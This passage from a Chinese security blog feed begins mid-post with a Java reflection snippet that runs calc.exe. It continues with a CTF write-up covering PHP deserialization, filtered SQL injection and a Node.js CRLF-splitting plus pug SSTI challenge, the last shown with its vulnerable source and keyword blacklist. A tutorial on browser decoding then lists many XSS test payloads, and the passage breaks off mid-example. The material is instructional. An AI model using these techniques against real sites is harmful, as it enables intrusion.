class="string">"java.lang.Runtime"</span>);</span><br><span class="line">Constructor m = clazz.getDeclaredConstructor();</span><br><span class="line">m.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">clazz.getMethod("exec", String.class).invoke(m.newInstance(), "calc.exe");</span><br></pre></td></tr></table></figure><p>过程为：</p><ol><li>先获取class对象</li><li>通过getDeclaredConstructor获得指定参数的构造方法</li><li>接下来调用<code>setAccessible(true)</code>绕过private修饰符检查</li><li>通过newInstance获得类实例对象</li></ol><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://zhuanlan.zhihu.com/p/60294147" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/60294147</a></p><p><a href="https://blog.csdn.net/searchin_r/article/details/84592516" target="_blank" rel="noopener">https://blog.csdn.net/searchin_r/article/details/84592516</a></p><p><a href="https://blog.csdn.net/liuxiao723846/article/details/90346160?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">https://blog.csdn.net/liuxiao723846/article/details/90346160?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task</a></p><p><a href="https://blog.csdn.net/gdutxiaoxu/article/details/68947735" target="_blank" rel="noopener">https://blog.csdn.net/gdutxiaoxu/article/details/68947735</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;RTTI的理解与介绍&quot;&gt;&lt;a href=&quot;#RTTI的理解与介绍&quot; class=&quot;headerlink&quot; title=&quot;RTTI的理解与介绍&quot;&gt;&lt;/a&gt;RTTI的理解与介绍&lt;/h3&gt;&lt;p&gt;RTTI (Run-Time Type Identification) 运行
      
    
    </summary>
    
    
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>i春秋公益赛web部分</title>
    <link href="http://yoursite.com/2020/02/25/i%E6%98%A5%E7%A7%8B%E5%85%AC%E7%9B%8A%E8%B5%9Bweb%E9%83%A8%E5%88%86/"/>
    <id>http://yoursite.com/2020/02/25/i%E6%98%A5%E7%A7%8B%E5%85%AC%E7%9B%8A%E8%B5%9Bweb%E9%83%A8%E5%88%86/</id>
    <published>2020-02-25T06:55:24.000Z</published>
    <updated>2020-02-25T06:56:36.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>跟着打了下比赛，也算稍微找回点状态吧…（还差一道题没做出有点痛苦），本来是想写一篇全部web题的wp的，但是感觉..有些题实在是没有什么写的意义，所以我就写一些这些题中比较有意思的吧。</p><h3 id="Babyphp"><a href="#Babyphp" class="headerlink" title="Babyphp"></a>Babyphp</h3><p>emmm 其实这题也没什么好说的，就是反序列化字符逃逸注入对象一下，因为safe函数处理的是序列化后的字符串，这样我们就可以在age字段中注入我们想要的属性内容，并且通过union-&gt;hacker的字符变换，成功把后面多余的字段扔掉，并且在unserialize的时候触发，执行我们的sql语句…pop链的构造也蛮简单，就不说了…</p><h3 id="Ezsqli"><a href="#Ezsqli" class="headerlink" title="Ezsqli"></a>Ezsqli</h3><p>这题蛮有趣的，找表倒是很快可以得到表的名称，但是查字段内容我耗了很久….，开始有两个思路，一个是找到系统未ban掉的包含字段内容的系统表，但是似乎不太行….，第二个思路，就是重新找一个无列名注入的思路，由于ban掉了union select字符串的组合，所以之前的通过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 union select * from user</span><br></pre></td></tr></table></figure><p>这种方法肯定是不行了</p><p>而且通过下发了几个容器之后，发现正则回溯的bypass的洞确实被补掉了，所以当时是想通过join实现一种新的方法的，不过没找到..，之后就在不断翻文章了，最后翻到了国外师傅这种新的无列名注入的手法（膜），详细操作见下图</p><p><img src="https://s2.ax1x.com/2020/02/24/38tQFf.png" alt="38tQFf.png"></p><p>看到了这种方法后，思考下如果在ban掉 &lt; ,=,&gt;的情况下还能否成功注入，需要注意的是这种是直接两个虚表的数据比较并不能用like或者regexp这种操作符，这种操作符只适合字符串之间的比较</p><p>那么 like 和 regexp这种操作符对于这种方法是否还依然适用呢？答案是肯定的，只不过这样就对flag表有要求了，只能是一个字段。</p><p>不过一个字段的操作性算蛮高了….也并不需要这种特殊的方法了..直接substr截取字符去比较就可以了</p><p>（PS: 由于ORM框架的出现可能注入题更多只能存在于CTF题中，但是感觉人们的这种研究精神还是很棒的，现在的CTF题中注入技巧也算比较成熟了，所以以后见到能带来惊喜的CTF注入题的机会也是越来越少了..更多高质量的比赛中也几乎放弃了注入类型题）</p><h3 id="node-game"><a href="#node-game" class="headerlink" title="node_game"></a>node_game</h3><p>这个题应该说是这个比赛中最好的题了（个人感觉，比赛的时候没做出来555</p><p>题目源码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> pug = <span class="built_in">require</span>(<span class="string">'pug'</span>);</span><br><span class="line"><span class="keyword">var</span> morgan = <span class="built_in">require</span>(<span class="string">'morgan'</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">'multer'</span>);</span><br><span class="line"></span><br><span class="line">app.use(multer(&#123;<span class="attr">dest</span>: <span class="string">'./dist'</span>&#125;).array(<span class="string">'file'</span>));</span><br><span class="line">app.use(morgan(<span class="string">'short'</span>));</span><br><span class="line">app.use(<span class="string">"/uploads"</span>,express.static(path.join(__dirname, <span class="string">'/uploads'</span>)))</span><br><span class="line">app.use(<span class="string">"/template"</span>,express.static(path.join(__dirname, <span class="string">'/template'</span>)))</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> action = req.query.action?req.query.action:<span class="string">"index"</span>;</span><br><span class="line">    <span class="keyword">if</span>( action.includes(<span class="string">"/"</span>) || action.includes(<span class="string">"\\"</span>) )&#123;</span><br><span class="line">        res.send(<span class="string">"Errrrr, You have been Blocked"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file = path.join(__dirname + <span class="string">'/template/'</span>+ action +<span class="string">'.pug'</span>);</span><br><span class="line">    <span class="keyword">var</span> html = pug.renderFile(file);</span><br><span class="line">    res.send(html);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/file_upload'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ip = req.connection.remoteAddress;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;</span><br><span class="line">        msg: <span class="string">''</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ip.includes(<span class="string">'127.0.0.1'</span>)) &#123;</span><br><span class="line">        obj.msg=<span class="string">"only admin's ip can use it"</span></span><br><span class="line">        res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    fs.readFile(req.files[<span class="number">0</span>].path, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            obj.msg = <span class="string">'upload failed'</span>;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> file_path = <span class="string">'/uploads/'</span> + req.files[<span class="number">0</span>].mimetype +<span class="string">"/"</span>;</span><br><span class="line">            <span class="keyword">var</span> file_name = req.files[<span class="number">0</span>].originalname</span><br><span class="line">            <span class="keyword">var</span> dir_file = __dirname + file_path + file_name</span><br><span class="line">            <span class="keyword">if</span>(!fs.existsSync(__dirname + file_path))&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fs.mkdirSync(__dirname + file_path)</span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    obj.msg = <span class="string">"file type error"</span>;</span><br><span class="line">                    res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fs.writeFileSync(dir_file,data)</span><br><span class="line">                obj = &#123;</span><br><span class="line">                    msg: <span class="string">'upload success'</span>,</span><br><span class="line">                    filename: file_path + file_name</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                obj.msg = <span class="string">'upload failed'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/core'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.query.q;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">'http://localhost:8081/source?'</span> + q</span><br><span class="line">        <span class="built_in">console</span>.log(url)</span><br><span class="line">        <span class="keyword">var</span> trigger = blacklist(url);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            res.send(<span class="string">"&lt;p&gt;error occurs!&lt;/p&gt;"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">resp</span>) </span>&#123;</span><br><span class="line">                    resp.setEncoding(<span class="string">'utf8'</span>);</span><br><span class="line">                    resp.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">if</span> (err.code === <span class="string">"ECONNRESET"</span>) &#123;</span><br><span class="line">                            <span class="built_in">console</span>.log(<span class="string">"Timeout occurs"</span>);</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line"></span><br><span class="line">                resp.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        resps = chunk.toString();</span><br><span class="line">                        res.send(resps);</span><br><span class="line">                    &#125;<span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                        res.send(e.message);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;).on(<span class="string">'error'</span>, (e) =&gt; &#123;</span><br><span class="line">                    res.send(e.message);&#125;);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.send(<span class="string">"search param 'q' missing!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> evilwords = [<span class="string">"global"</span>, <span class="string">"process"</span>,<span class="string">"mainModule"</span>,<span class="string">"require"</span>,<span class="string">"root"</span>,<span class="string">"child_process"</span>,<span class="string">"exec"</span>,<span class="string">"\""</span>,<span class="string">"'"</span>,<span class="string">"!"</span>];</span><br><span class="line">    <span class="keyword">var</span> arrayLen = evilwords.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrayLen; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> trigger = url.includes(evilwords[i]);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">8081</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> host = server.address().address</span><br><span class="line">    <span class="keyword">var</span> port = server.address().port</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Example app listening at http://%s:%s"</span>, host, port)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>代码的意思蛮好理解的，主要看几个路由的作用吧</p><ul><li>file_upload路由：通过dest中间件进行文件上传，并且限制了ip只能为127.0.0.1</li><li>core路由：拼合传入q参数与之前的url 传入http.get进行请求</li></ul><p>其实仔细看core路由就会发现拼合的这个url 的host就是127.0.0.1 也就是我们上传文件所需要的，不难想到直接可以通过crlf拆分http把我们上传的posti请求直接加在这个host为127.0.0.1的请求中，并且我们可以通过文件类型进行跨目录上传</p><p>然而拼包..一直503…</p><p>赛后看了下exp 应该是由于发送了不完整了http请求导致的</p><p>官方的exp链接</p><p><a href="https://blog.5am3.com/2020/02/11/ctf-node1#nullcon-HackIM-2020-split-second" target="_blank" rel="noopener">https://blog.5am3.com/2020/02/11/ctf-node1#nullcon-HackIM-2020-split-second</a></p><p>看exp就比较容易理解了</p><p>最后简单的说一下服务端处理的流程吧。</p><p>首先看一下node对字符的一些处理</p><blockquote><p>虽然用户发出的<code>http</code>请求通常将请求路径指定为字符串，但Node.js最终必须将请求作为原始字节输出。JavaScript支持unicode字符串，因此将它们转换为字节意味着选择并应用适当的unicode编码。对于不包含主体的请求，Node.js默认使用“latin1”，这是一种单字节编码，不能表示高编号的unicode字符，例如</p></blockquote><p>所以对于后端buffer处理为如下：</p><p><img src="https://s2.ax1x.com/2020/02/24/3JCumn.png" alt="3JCumn.png"></p><p>所以这就可以进行拆分crlf进行攻击了</p><p>（下次直接用py处理完整的文件上传包…绝不手拼）</p><p>上传的pug文件通过#{}或者-进行SSTI都可以，也可以用include语法</p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>PS：希望可以快速成长起来，现在还是远远不够啊..加油吧！</p><p>感觉似乎越来越能接受理性和排斥感性了…但偶尔还是会很感性。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;跟着打了下比赛，也算稍微找回点状态吧…（还差一道题没做出有点痛苦），本来是想写一篇全部web题的wp的，但是感觉..有些题实在是没有什么写的
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>从浏览器渲染与解码原理重新认识xss</title>
    <link href="http://yoursite.com/2020/02/14/%E4%BB%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E4%B8%8E%E8%A7%A3%E7%A0%81%E5%8E%9F%E7%90%86%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86xss/"/>
    <id>http://yoursite.com/2020/02/14/%E4%BB%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E4%B8%8E%E8%A7%A3%E7%A0%81%E5%8E%9F%E7%90%86%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86xss/</id>
    <published>2020-02-14T06:44:07.000Z</published>
    <updated>2020-02-14T06:46:42.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在家瘫了很多天了（夹杂着一些个人感情问题</p><p>花了很多时间，虽然没有学习，但是理清了一些东西吧，也算是另一种收获了。</p><p>我可能算是一个比较感性的人吧，过去，我觉得人活的过于理性实在是太累了，所以没必要那么理性的去生活，现在反而觉得理性的活着其实是更轻松的生活态度，毕竟有些感情上的事情真的让人很难过(我似乎每天都很难过，从高二开始，真想做一个完全理性化的人啊.jpg(正在努力转变的过程)(不说了,开始正题吧</p><h3 id="浏览器的渲染原理"><a href="#浏览器的渲染原理" class="headerlink" title="浏览器的渲染原理"></a>浏览器的渲染原理</h3><p>目前主要的两个渲染引擎为 webkit和Gecko</p><p>Geoko为Firefox使用，而Chrome和Safari主要使用是Webkit</p><p>Webkit渲染引擎流程如下：</p><p><img src="https://user-gold-cdn.xitu.io/2018/2/22/161bb3c9b220f8cb?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>渲染的五个步骤如下：</p><blockquote><ol><li>处理 HTML 标记并构建 DOM 树。</li><li>处理 CSS 标记并构建 CSSOM 树。</li><li>将 DOM 与 CSSOM 合并成一个渲染树。</li><li>根据渲染树来布局，以计算每个节点的几何信息。</li><li>将各个节点绘制到屏幕上。</li></ol></blockquote><h4 id="CSSOM树与DOM树的构建"><a href="#CSSOM树与DOM树的构建" class="headerlink" title="CSSOM树与DOM树的构建"></a>CSSOM树与DOM树的构建</h4><p>对于DOM树：浏览器接受HTML文档后，将遍历文档节点，生成DOM树。</p><p>对于CSSOM树：浏览器解析CSS文件生成CSS规则树，每个CSS文件被分析为包含着CSS规则的StyleSheet对象。</p><h4 id="渲染阻塞"><a href="#渲染阻塞" class="headerlink" title="渲染阻塞"></a>渲染阻塞</h4><p>DOM树构建过程中会收到css和javascript的阻塞，</p><p>在构建过程中，如果遇见js脚本则会去执行，那么就会影响DOM树构建。</p><p>但是css文件的优先性是大于js的优先性的</p><p>在浏览器解析html的时候，会把新来的元素插入dom树种，并且同时查找css，把对应的样式规则应用到元素身上。</p><p>所以css和js的文件放置顺序一般为：css优先，js最后。</p><h3 id="浏览器的解码"><a href="#浏览器的解码" class="headerlink" title="浏览器的解码"></a>浏览器的解码</h3><h4 id="浏览器的解码规则"><a href="#浏览器的解码规则" class="headerlink" title="浏览器的解码规则"></a>浏览器的解码规则</h4><ul><li>HTML解析器对HTML文档进行解析完成HTML解码并且创建DOM树</li><li>javascript 或者 CSS解析器对内联脚本进行解析，完成JS CSS解码</li><li>URL解码会根据URL所在的顺序不同而在JS解码前或者解码后</li></ul><h4 id="HTML解码器"><a href="#HTML解码器" class="headerlink" title="HTML解码器"></a>HTML解码器</h4><p>html中五类元素如下：</p><ol><li>空元素(Void elements)，如<code>&lt;area&gt;</code>,<code>&lt;br&gt;</code>,<code>&lt;base&gt;</code>等等</li><li>原始文本元素(Raw text elements)，有<code>&lt;script&gt;</code>和<code>&lt;style&gt;</code></li><li>RCDATA元素(RCDATA elements)，有<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code></li><li>外部元素(Foreign elements)，例如MathML命名空间或者SVG命名空间的元素</li><li>基本元素(Normal elements)，即除了以上4种元素以外的元素</li></ol><p>五类元素的特点：</p><ol><li>空元素，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。</li><li>原始文本元素，可以容纳文本。</li><li>RCDATA元素，可以容纳文本和字符引用。</li><li>外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释</li><li>基本元素，可以容纳文本、字符引用、其他元素和注释</li></ol><h4 id="javascript解码器"><a href="#javascript解码器" class="headerlink" title="javascript解码器"></a>javascript解码器</h4><p>javascript解码器有一个特点，就是无法试别编码后的控制字符，比如：单引号，双引号和圆括号，之后会用一些例子进行详细说明。</p><h4 id="URL解码器"><a href="#URL解码器" class="headerlink" title="URL解码器"></a>URL解码器</h4><p>对url编码后的数据进行解码，需要注意的一点是，协议不能进行编码，否则URL解码器将无法试别。</p><p>下面是一些例子来更好的理解着三个编码器的作用</p><h4 id="例子测试"><a href="#例子测试" class="headerlink" title="例子测试"></a>例子测试</h4><p>1.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p>URL encode “javascript:alert(1)”</p><p>此js代码无法执行，href属性内部为url编码的数据，所以URL解码器会进行处理，但是无法试别编码后的javascript协议，所以不会进行解码，也就无法执行。</p><p>在URL的规定，用户名，密码，协议都必须是ASCII。</p><p>2.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt;</span><br></pre></td></tr></table></figure><p>前面的HTML编码数据解码为javascript，后面的URL解码为alert(2)</p><p>此js可以执行</p><p>浏览器解码流程为，先丢给HTML解码器，解码后为</p><p>javascript+urlencode(data)</p><p>此时URL解码器可以试别协议名称，所以会进行URL解码</p><p>最后被执行js代码</p><p>3.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javascript%3aalert(3)&quot;&gt;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p>同一，URL解码器无法识别协议名称，无法解码，最终js无法被执行。</p><p>4.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;&amp;#60;img src&#x3D;x onerror&#x3D;alert(4)&amp;#62;&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><p>这里的<code>&amp;#60;</code>虽然会被解码为&lt;，但是无法进入标签开始状态，因为这里的<code>&amp;#60;</code>是相当于字符串的，并不是相当于真正的标签，所以alert并不会被执行。</p><p>5.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;&#x2F;script&amp;#62;&lt;&#x2F;textarea&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;textarea&gt;</code>是RCDATA元素，可以容纳文本和字符引用，也就是说textarea标签里的内容可以被html解码，但是textarea中无法容纳其他标签，js代码不会被执行。</p><p>6.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea&gt;&lt;script&gt;alert(6)&lt;&#x2F;script&gt;&lt;&#x2F;textarea&gt;</span><br></pre></td></tr></table></figure><p>和刚才是一样的，textarea标签中无法容纳其他标签。</p><p>7.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick&#x3D;&quot;confirm(&#39;7&#39;);&quot;&gt;Button&lt;&#x2F;button&gt;</span><br></pre></td></tr></table></figure><p>HTML实体解码将<code>&amp;#39;</code>解码为’，并且前面为onclick属性，丢给js引擎处理，成功执行弹窗。</p><p>8.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick&#x3D;&quot;confirm(&#39;8\u0027);&quot;&gt;Button&lt;&#x2F;button&gt;</span><br></pre></td></tr></table></figure><p>js中只有字符串和标识符可以用unicode来表示，所以js无法将unicode编码后的单引号解码，所以无法执行此js脚本</p><p>9.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>script标签无法容纳字符引用，所以无法进行HTML解码，直接交给js来处理，无法执行此代码</p><p>10.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(10);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>前五个字符js解码后为alert标识符，而js是可以解码标识符的，所以可以成功执行js</p><p>11.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>有括号，无法试别控制字符，无法执行</p><p>12.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>这个挺有趣的，\u0031\u0032被翻译为12，不过这个12是字符串类型的，并非数字类型的，需要引号，这里没有引号，无法执行。</p><p>13.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#39;14\u000a&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>\u000a为换行字符，可以只执行</p><p>14.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a 